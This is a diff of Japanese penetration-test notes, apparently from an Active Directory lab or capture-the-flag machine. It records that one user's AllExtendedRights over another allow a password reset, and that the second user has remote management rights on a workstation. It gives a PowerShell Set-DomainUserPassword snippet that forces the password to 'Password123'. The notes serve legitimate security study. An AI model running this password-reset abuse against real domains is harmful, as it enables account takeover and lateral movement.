@@ -308,10 +308,11 @@ cmdkey ->なし
 - AS-REP roastable、Kerberoastableは両方存在しない
 
 - r.andrewsは、G.Jarvisに"AllExtendedRights"をもつため、パスワード変更が可能
+	- また、G.JARVISは、WS26にRemote Managerの権限をもつ
 ![[Pasted image 20260222163423.png]]
 
 ```powershell
-$NewPassword = ConvertTo-SecureString "<new_pw>" -AsPlainText -Force
+$NewPassword = ConvertTo-SecureString "Password123" -AsPlainText -Force
 Set-DomainUserPassword -Identity "<Target_UserDN>" -AccountPassword $NewPassword
 ```
 
